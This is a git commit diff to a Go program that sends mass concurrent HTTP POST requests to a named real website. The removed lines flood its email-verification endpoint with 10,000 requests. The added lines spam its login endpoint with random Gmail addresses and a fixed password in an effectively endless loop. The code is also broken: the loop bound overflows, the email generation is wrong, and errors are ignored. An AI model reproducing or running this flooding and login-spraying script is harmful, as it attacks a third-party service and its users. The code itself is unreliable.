32711d68d294698ab62dca9bd8e2a12250d7f5d5
leetomlee123 <leetomlee123@gmail.com>
2022-04-12 18:12:07 +0800

    1111

--- test.go
+++ test.go
@@ -3,15 +3,25 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
+	"math/rand"
 	"net/http"
 	"net/url"
+	"strconv"
+	"strings"
 	"time"
 )
 
+func randomEmail() {
+	for i := 0; i < 5; i++ {
+		fmt.Println()
+	}
+}
+
 func main() {
 	ch2 := make(chan interface{})
-	for i := 0; i < 10000; i++ {
-		go httpPostForm("1234qwer@gmail.com", ch2)
+	for i := 0; i < 100000000000000000000000000000; i++ {
+
+		go httpPostForm(string(rand.Int())+"@gmail.com", ch2)
 	}
 	i := 0
 	for {
@@ -31,11 +41,17 @@ func main() {
 Loop:
 	print("执行完成")
 }
-
+func zhToUnicode(raw []byte) ([]byte, error) {
+	str, err := strconv.Unquote(strings.Replace(strconv.Quote(string(raw)), `\\u`, `\u`, -1))
+	if err != nil {
+		return nil, err
+	}
+	return []byte(str), nil
+}
 func httpPostForm(email string, chanel chan interface{}) {
 	chanel <- email
-	resp, err := http.PostForm("https://fq.rs/api/v1/passport/comm/sendEmailVerify",
-		url.Values{"key": {"value"}, "email": {email}})
+	resp, err := http.PostForm("https://fq.rs/api/v1/passport/auth/login",
+		url.Values{"key": {"value"}, "email": {email}, "password": {"fkairport1314"}})
 	if err != nil {
 		// handle error
 	}
@@ -45,9 +61,11 @@ func httpPostForm(email string, chanel chan interface{}) {
 	if err != nil {
 		// handle error
 	}
+	textQuoted := string(body)
+	textUnquoted := textQuoted[1 : len(textQuoted)-1]
+	v, _ := zhToUnicode([]byte(textUnquoted))
+	print(v)
 
-	fmt.Println(string(body))
-
-	chanel <- string(body)
+	chanel <- textQuoted
 
 }
